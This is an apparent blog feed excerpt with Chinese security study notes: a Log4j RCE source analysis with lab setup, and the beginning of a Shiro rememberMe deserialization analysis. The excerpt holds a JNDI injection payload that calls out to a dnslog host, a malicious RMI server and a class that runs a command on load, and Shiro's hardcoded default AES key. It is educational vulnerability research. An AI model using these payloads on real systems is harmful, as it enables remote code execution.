title="UDP"></a>UDP</h4><p>UDP是基于IP的简单协议,不用建立链接就可以带着目的端口和源端口进行通信</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;这里总结一下我在进行面试复习的时候复习的知识点,根据网上各位师傅的面试经验进行问题回答总结,留作记录,每个问题的回答是基于本人情况并且站</summary>
      
    
    
    
    
    <category term="面试" scheme="https://men9da.cn/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Log4j-RCE源码分析</title>
    <link href="https://men9da.cn/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2022-04-17T06:08:44.000Z</published>
    <updated>2022-04-17T07:47:12.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>Log4j是去年爆出来的漏洞了,但是那个时候研究java安全的能力还是0,如今在学习java安全的过程中来弥补一下当时的遗憾,当时拿着payload只能弹弹dnslog,完全不理解jndi,rmi这些调用机制,如今看来Log4j的漏洞触发并不复杂,但是简单的利用便可造成非常广泛的严重后果。</p><p>影响版本为2.0 &lt;= Apache log4j2 &lt;= 2.14.1</p><h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01:环境搭建"></a>0x01:环境搭建</h1><p>个人认为搭建环境的过程是对漏洞理解不可缺少的一部分</p><p>maven项目pom.xml文件内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>log4j Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- FIXME change it to the project&#x27;s website --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.example.com<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span><span class="comment">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-clean-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-install-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新建src/main/java/com/test/log4j.java,代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger log = LogManager.getLogger(log4j.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;$&#123;jndi:ldap://xxx.xxx.xxx./&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02:漏洞验证"></a>0x02:漏洞验证</h1><p>首先我们通过payload可以发现payload形如${jndi:ldap://xxx.xxx.xxx./},可以触发远程调用,首先用dnslog测试以下漏洞是否存在</p><p>用我自己写的dnslog插件,获取一个domain</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417142427592.png" class title="image-20220417142427592"><p>填入payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.error(<span class="string">&quot;$&#123;jndi:ldap://23ee7398.toxiclog.xyz./&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行程序,收到dnslog请求</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417142505268.png" class title="image-20220417142505268"><p>成功触发dnslog解析</p><h1 id="0X03-漏洞分析"><a href="#0X03-漏洞分析" class="headerlink" title="0X03:漏洞分析"></a>0X03:漏洞分析</h1><p>开启debug模式后跟进log.error进行分析,我们可以看到在AbstractLogger.class中有很多个error方法,我们传递给error方法的参数是一个字符串,进入参数为字符串的error方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417142655730.png" class title="image-20220417142655730"><p>继续跟进this.logMessage方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417142854832.png" class title="image-20220417142854832"><p>在经过logMessageSafely-&gt;logMessageTrackRecursion-&gt;tryLogMessage方法后来到ERROR.log方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417143045676.png" class title="image-20220417143045676"><p>继续跟进到DefaulReliabilityStrategy.loggerConfig.log</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417143222803.png" class title="image-20220417143222803"><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417143431534.png" class title="image-20220417143431534"><p>跟进后来到LoggerConfig.class中的282行处的this.log,跟进</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417143544372.png" class title="image-20220417143544372"><p>继续跟进proccessLogEvent</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417143734516.png" class title="image-20220417143734516">跟进this.callAppenders<img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417144148707.png" class title="image-20220417144148707"><p>跟进第358行的callAppender</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417144240756.png" class title="image-20220417144240756"><p>跟进callAppenderPreventRecursion</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417144415684.png" class title="image-20220417144415684"><p>然后通过调用栈AppenderControl.callAppender0-&gt;AppenderControl.tryCallAppender-&gt;AppenderControl.appender.append-&gt;ConsoleAppender.append-&gt;ConsoleAppender.directEncodeEvent-&gt;ConsoleAppender.getLayout().encode()-&gt;PatternLayout.toText-&gt;PatternLayout.toSerializable</p><p>在PatternLayout.toSerializable中第406行中依次调用formaters中的format方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417145356506.png" class title="image-20220417145356506"><p>其中formaters内容如下</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417145500873.png" class title="image-20220417145500873"><p>当我们的this.formatters[i]中的converter为MessagePatternConverter的时候跟进MessagePatternConverter的format方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417145711265.png" class title="image-20220417145711265"><p>跟进MessagePatternConverter的format方法,看到第116行处,判断我们输入的参数是不是以${开头的,如果是,提取出我们的值到value变量,然后调用StrSubstitutor.replace方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417145849433.png" class title="image-20220417145849433"><p>StrSubstitutor.replace方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417151649238.png" class title="image-20220417151649238"><p>跟进StrSubstitutor.substitute方法,看到418行处的StrSubstitutor.resolveVariable方法</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417151822165.png" class title="image-20220417151822165"><p>跟进</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417151913954.png" class title="image-20220417151913954">首先获取了resolver,这是一些定义的lookup处理类型,可以看到有date,java,jndi等lookup类型<img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417152011618.png" class title="image-20220417152011618"><p>跟进resolver.lookup,分析可知在186行处获得payload字符串中:的索引,将我们的payload:左边的值(jndi)取出,放入prefix变量中,然后name变量就是冒号右边的值,</p><p>在190行根据prefix获取了对应的jndi的lookup,然后在197行使用jndilookup,其参数就是ldap://xxx.xxx.xxx.xxx./(注:测时发现此处必须要在domain后加上一个/,不然不能触发dns解析,具体原因暂时未知)</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417152134074.png" class title="image-20220417152134074"><p>到这里就调用原生lookup方法了,要执行rmi,ldap远程调用都没问题,执行完成后dnslog收到请求</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417152635449.png" class title="image-20220417152635449"><h1 id="0x04-利用rmi加载恶意类执行命令"><a href="#0x04-利用rmi加载恶意类执行命令" class="headerlink" title="0x04:利用rmi加载恶意类执行命令"></a>0x04:利用rmi加载恶意类执行命令</h1><p>本地起一个恶意rmi服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, NamingException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Payload&quot;</span>, <span class="string">&quot;Payload&quot;</span>, <span class="string">&quot;http://127.0.0.1:80/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;C:&quot;</span>+Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;payload:&quot;</span>+Runtime.getRuntime());</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过log4j触发弹出计算器</p><img src="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20220417153745270.png" class title="image-20220417153745270"><h1 id="0X05-补充"><a href="#0X05-补充" class="headerlink" title="0X05:补充"></a>0X05:补充</h1><p>刚刚都是围绕log.error来进行触发的,实际上还有log.warn,log.fatal,log.info等方法,在我的测试环境中只有log.error和log.fatal可以触发漏洞.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;Log4j是去年爆出来的漏洞了,但是那个时候研究java安全的能力还是0,如今在学习java安全的过程中来弥补一下当时的遗憾,当时拿着p</summary>
      
    
    
    
    
    <category term="Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Log4j" scheme="https://men9da.cn/tags/Log4j/"/>
    
  </entry>
  
  <entry>
    <title>shiro系列漏洞分析</title>
    <link href="https://men9da.cn/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-03-17T05:47:11.000Z</published>
    <updated>2022-03-17T08:20:23.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>经过一段时间的java安全知识的学习,对整个java安全的认知也进一步加深,平时耳熟能详的shiro也来到了我的java安全学习日程中,接下来就针对shiro系列漏洞shiro550,shiro721进行一波学习。</p><h1 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h1><p>shiro是一款安全框架,他主要干的事情就是和身份验证,授权,会话管理等有关的事情,shiro550和shiro721的漏洞触发点都是因为shiro在登陆的时候提供了一个大家经常都能用到的功能:记住登陆状态,下次登录就不用重新输入密码了。但是shiro在处理他时采用的办法是在cookie中加入一个rememberMe字段,并且往里面保存加密后的序列化数据,当用户再次登录会直接反序列化这一段数据来获得用户信息.我们要是知道加密方式就能任意触发反序列化代码导致漏洞出现</p><h1 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h1><p><strong>部署</strong></p><p>直接访问</p><p><a href="https://github.com//apache/shiro/archive/refs/tags/shiro-root-1.2.4.zip">https://github.com//apache/shiro/archive/refs/tags/shiro-root-1.2.4.zip</a></p><p>下载后使用idea打开使用maven一键下载依赖,然后配置tomcat,deployment选择samples-web:war包</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317154146258.png" class title="image-20220317154146258"><p>这里我省去了前面参数传递方法,以及拦截器部分的分析,直接分析核心加密解密方法</p><p>来到AbstractRememberMeManager.java中,这是用来处理rememberMe的一个manager,在其中可以看到decrypt方法用来解密密文,decrypt方法需要两个参数,encrypted(加密密文),getDecryptionCipherKey(解密密钥)</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317142033493.png" class title="image-20220317142033493"><p>此处CipherService是一个接口,调用此接口的decrypt方法进行解密,CipherService中定义了一些用于加密解密常用方法</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317142656313.png" class title="image-20220317142656313"><p>看一波getDecryptionCipherKey(),发现他直接返回了decryptionCipherKey</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317144723842.png" class title="image-20220317144723842"><p>我们搜索this.decryptionCipherKey,发现他是在setDecryptionCipherKey中被赋值的</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317144821750.png" class title="image-20220317144821750"><p>搜索setDecryptionCipherKey,在setCipherKey中进行赋值,可以看到这里传入了一个byte[] cipherkey</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317144909832.png" class title="image-20220317144909832"><p>查找setCypherKey,找到了,在AbstractRememberMeManager调用setCipherKey,传入了一个默认的DEFAULT_CIPHER_KEY_BYTES</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317145033308.png" class title="image-20220317145033308"><p>这个默认的DEFAULT_CIPHER_KEY_BYTES值为kPH+bIxk5D2deZiIxcaaaA==,到这里我们就发现问题了,当用户没有自己定义自己的cipherkey时会默认使用默认的cipherkey进行加密解密</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317145110985.png" class title="image-20220317145110985"><p>知道密钥是从哪儿来的了,那么现在看看那个地方调用了解密函数decrypt</p><p>在convertBytesToPrincipals中调用了decrypt并返回了deserialize</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317145945542.png" class title="image-20220317145945542"><p>我们跟进deserialize看看解密过程,跟进cipherService.decrypt</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317151534182.png" class title="image-20220317151534182"><p>稍微运行一下我们就能在变量中看到整个AES加密模式以及iv偏移量</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317151745461.png" class title="image-20220317151745461"><p>可以看到AES采用CBC加密模式,iv偏移值为16位的</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317151849924.png" class title="image-20220317151849924"><p>接下来跟进deserialize,调用getSerializer获取DefaultSerializer并调用DefaultSerializer.deserialize方法</p><img src="/2022/03/17/shiro%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220317150255656.png" class 